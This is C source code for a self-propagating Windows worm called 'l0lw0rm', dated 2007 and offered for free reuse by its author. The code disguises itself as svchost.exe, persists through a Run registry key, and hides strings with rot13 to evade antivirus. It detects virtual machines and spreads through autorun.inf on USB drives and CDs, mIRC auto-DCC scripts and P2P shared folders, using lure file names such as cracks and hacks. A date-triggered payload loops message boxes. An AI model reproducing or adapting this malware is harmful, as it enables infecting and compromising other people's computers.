/*
 *   l0lw0rm by Ravo_5002
 *   spreads trough Thumbdrives, CD's, mIRC and Peer 2 Pear clients
 *   Code can be used freely, as long as I am credited....
 *   21st of June 2007
 */

#include <stdio.h>
#include <windows.h>

#include "zipstore.h" /* for zipping */

/* globals */
char *exename = "svchost.exe";           /* what will show in the taskmanager */
char *spreadname = "protector.exe";     /* what will show in the CD and Thumbdrives */
char *regname = "Service Host Manager";             /* what will show in the registry entry */
char *mutex = "wazaaapldsfsdf";         /* mutex to prevent multiple copies running */

volatile char* LOL = "Hello Antivirus makers. This is VXer Ravo_5002 speaking. Please call this virus W32.l0lw0rm. How the fuck do you make up these names anyways? -Rav";

char *p2pfiles[] = { /* what we will offer the file as in the Peer 2 Peer clients */
     "Windows.Activation.Crack.Final-ETH0.zip", "systemcrack.exe",
     "Windows.Live.Messenger.Beta.Serial.Generator-PARADOX.zip", "msngen.exe",
     "Virtua.Girl.Serial.Pack.wih.10.Girls-TorrentZ.zip", "virtuagrl.exe",
     "MSN.Hacker.zip", "msnhack.exe",
     "Hotmail.Hacker.zip", "hotmailhack.exe",
     "Aim.Hacker.zip", "aimhack.exe",
     "Counterstrike.Source.aimbot.zip", "aimbot.exe",
     "Xbox.Live.Serial.Generator.zip", "xblgen.exe",
     "Saddam.Hanging-NEW-VERSION!.zip", "Saddam hang you bitch!.exe",
     "XXX.Passes.Juli.2007.zip", "passlist.txt______________________________________.exe",
     NULL, NULL     
};

/* prototyping */
int infect(char *path, char *filename);
int cdcopy(char *filename);
int drivecopy(char *filename);
int rot13(char input[256], char output[256]);
int redpill(void);
int p2pcopy(char *filename);
int mirccopy(char *filename);
int addlog(char *line, ...);

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil) {
    /* Entry point */                        
    if(redpill()) {
        payload(); /* fuck virtual machines :) */   
    }
	
    char filename[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename)); /* getting current filename */
 
    /* check if user executed from thumbdrive, if so lets open it for him ... */
    char path[MAX_PATH];
    strcpy(path, filename);
    path[3] = '\0';
    if(GetDriveType(path) == DRIVE_REMOVABLE) {
        ShellExecute(NULL, "open", path, "", NULL, SW_SHOW); /* FIXME: change window of My Computer to the path */
    }
    
    char *userprofile = getenv("USERPROFILE");
    char installpath[MAX_PATH];
    sprintf(installpath, "%s\\%s", userprofile, exename); /* C:\Documents and Settings\User */
    
    if(strcmp(filename, installpath)) { /* install it to hdd for maximum doom ;) */
        /* now thats done lets continue installing ourselves... */
        CopyFile(filename, installpath, 1);
        SetFileAttributes(installpath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
        
    	HKEY startup;
    	char *key13 = "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha"; /* "Software\\Microsoft\\Windows\\CurrentVersion\\Run" */
    	char key[256];
    	rot13(key13, key);
    	RegCreateKeyEx(HKEY_LOCAL_MACHINE , key, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &startup, NULL);
    	RegSetValueEx(startup, regname, 0, REG_SZ, installpath, strlen(installpath));
    	RegCloseKey(startup);

        /* installed, lets do the initial startup */
        ShellExecute(NULL, "open", installpath, "", NULL, SW_HIDE);
        Sleep(2000); /* wait till the process is started... */
        ExitProcess(EXIT_SUCCESS);                  
    }
    
    /* if the worm is already running there is no need for this process */
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, mutex), 15000) == WAIT_TIMEOUT) {
		ExitProcess(EXIT_FAILURE);
	}
    /* see if doomsday is there... */
    char *date = getenv("DATE");
    if((date == "10/07/2007") || (date == "07/10/2007") || (date == "7/10/2007")) {
        payload();
    } 
    /* otherwise lets kick ass ;) */
    
    p2pcopy(filename); /* infect Peer 2 Peer clients */
    mirccopy(filename); /* infect mIRC */
    
    while(1) { 
        Sleep(6000);
        
        drivecopy(filename); /* infect Thumbdrive */

        if(FindWindow(NULL, "CD Writing Wizard")) { /* infect CD just before user burns one :) */
            cdcopy(filename); 
        }
    }
    return 0;
}

int infect(char *path, char *filename) {

    char wormpath[MAX_PATH];
    char infpath[MAX_PATH];
    sprintf(wormpath, "%s%s", path, spreadname);
    sprintf(infpath, "%sautorun.inf", path);
    
    FILE *inf;
    inf = fopen(infpath, "w");
    if(inf == NULL) {
        //printf("DEBUG:: Cannot create files at %s\n", path);
        return 0;       
    }
    fprintf(inf, "[autorun]\n");
    fprintf(inf, "shellexecute=%s\n", spreadname);
    fprintf(inf, "action=Open folder to view files\n");
    fprintf(inf, "shell\\infected=Open\n");
    fprintf(inf, "shell\\infected\\command=%s\n", spreadname);
    fprintf(inf, "shell=infected\n");
    fclose(inf);
    
    CopyFile(filename, wormpath, 1);
    
    /* hide the files... */
    SetFileAttributes(wormpath ,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    SetFileAttributes(infpath ,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    return 1;
}

int cdcopy(char *filename) {
    char *userprofile = getenv("USERPROFILE");
    char burningpath[MAX_PATH];
    char *dirstring13 = "Ybpny Frggvatf\\Nccyvpngvba Qngn\\Zvpebfbsg\\PQ Oheavat\\"; /* \\Local Settings\\Application Data\\Microsoft\\CD Burning\\ */
    char dirstring[256];
    rot13(dirstring13, dirstring);
    sprintf(burningpath, "%s\\%s", userprofile, dirstring);
    if(infect(burningpath, filename)) {
        //printf("DEBUG:: Infected CD Burning Directory\n");
        return 1;                    
    } 
    return 0;
}

int mirccopy(char *filename) {
    /* Lets give irc users some rules... ;) */
    char mircdir[MAX_PATH];
    DWORD mircdirlen = sizeof(mircdir);
    
    HKEY mirc;
   	char *mirckey13 = "Fbsgjner\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Havafgnyy\\zVEP"; /* "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIRC" */
    char mirckey[256];
    rot13(mirckey13, mirckey);
    RegOpenKeyEx(HKEY_CURRENT_USER, mirckey, 0, KEY_QUERY_VALUE, &mirc); 
    RegQueryValueEx(mirc, "UninstallString", 0, NULL, mircdir, &mircdirlen);
    RegCloseKey(mirc);

    char mirczip[MAX_PATH];
    sprintf(mirczip, "%s\\CHANNEL-RULES.zip", mircdir);
    zip_store(filename, mirczip, "RULES.TXT______________________________________.exe");
    
    char mircscript[MAX_PATH];
    sprintf(mircscript, "%s\\script.ini", mircdir); /* Find script.ini from mIRC */
    
    FILE *script;
    script = fopen(mircscript, "w");
    if(script) {
        fprintf(script, "[Script]\n");
        fprintf(script, "sn0=ON 1:JOIN:#:{\n");
        fprintf(script, "n1=/dcc send $nick CHANNEL-RULES.zip\n");
        fprintf(script, "n2=}\n");
        fclose(script);    
    }
    return 1;    
}

int drivecopy(char *filename) {
    char drives[105]; /* max possible (26*4+1) */
    int drivesize = GetLogicalDriveStrings(104, drives);
    drivesize = drivesize / 4;
    char *tmp = drives;
    int i;
    int count = 0;
    for(i = 0; i < drivesize; i++) {
        if((GetDriveType(tmp) == DRIVE_REMOVABLE) && !(strstr(tmp, "A")) && !(strstr(tmp, "B")) ) { /* we dont want floppy's */
            //printf("DEBUG:: Trying to infect %s\n", tmp);
            if(infect(tmp, filename)) {
                //printf("DEBUG:: Infected %s\n", tmp);
                count++;
            }
        }
        tmp = tmp + 4;        
    }
    return count;   
}

int p2pcopy(char *filename) {

    char kazaapath[MAX_PATH];
    DWORD kazaapathlen = sizeof(kazaapath);
    
    HKEY kazaa;
   	char *kazaakey13 = "Fbsgjner\\Xnmnn\\Genafsre"; /* "Software\\Kazaa\\Transfer" */
    char kazaakey[256];
    rot13(kazaakey13, kazaakey);
    RegOpenKeyEx(HKEY_CURRENT_USER, kazaakey, 0, KEY_QUERY_VALUE, &kazaa); 
    RegQueryValueEx(kazaa, "DlDir0", 0, NULL, kazaapath, &kazaapathlen);
    RegCloseKey(kazaa);

    char kazaazip[MAX_PATH];
    
    char *userprofile = getenv("USERPROFILE");
    char sharedpath[MAX_PATH];
    sprintf(sharedpath, "%s\\Shared", userprofile);
    
    char sharedzip[MAX_PATH];
    int i;
    for(i = 0; p2pfiles[i] != NULL; i = i + 2) {
        /* filling the kazaa shared folder... */
        sprintf(kazaazip, "%s\\%s", kazaapath, p2pfiles[i]);
        zip_store(filename, kazaazip, p2pfiles[i+1]);
        
        /* filling the other shared folders... */
        sprintf(sharedzip, "%s\\%s", sharedpath, p2pfiles[i]);
        zip_store(filename, sharedzip, p2pfiles[i+1]);
    }
    return 1;
}

int payload(void) {
    while(1) {
        MessageBox(NULL, "YOU ARE iNFECTED BY RAVO_5002", "Doomsday Has Come...", MB_OK);
        /* lame i know ;P */        
    }
    return 0;   
}

int rot13(char input[256], char output[256]) {
    /* rot 13 encryption to fool a/v */ 
    int i = 0;
    do {
        if(input[i] <= 'm' && isalpha(input[i]) && islower(input[i])) {
            output[i] = input[i] + 13;
         }
        else if(input[i] <= 'M' && isalpha(input[i]) && isupper(input[i])) {
            output[i] = input[i] + 13;
        }
        else if(input[i] >= 'n' && isalpha(input[i]) && islower(input[i])) {
            output[i] = input[i] - 13;       
        }
        else if(input[i] >= 'N' && isalpha(input[i]) && isupper(input[i])) {
            output[i] = input[i] - 13;       
        }
        else {
            output[i] = input[i];     
        }
        i++;
    } while(input[i] != '\0');
    output[i] = '\0';
    return 1;
}

int redpill(void) { /* thanks to Joanna Rutkowska (C) */
    unsigned char m[2+4], rpill[] = "\x0f\x01\x0d\x00\x00\x00\x00\xc3";
    *((unsigned*)&rpill[3]) = (unsigned)m;
    ((void(*)())&rpill)();
    return (m[5] > 0xd0) ? 1 : 0;
}

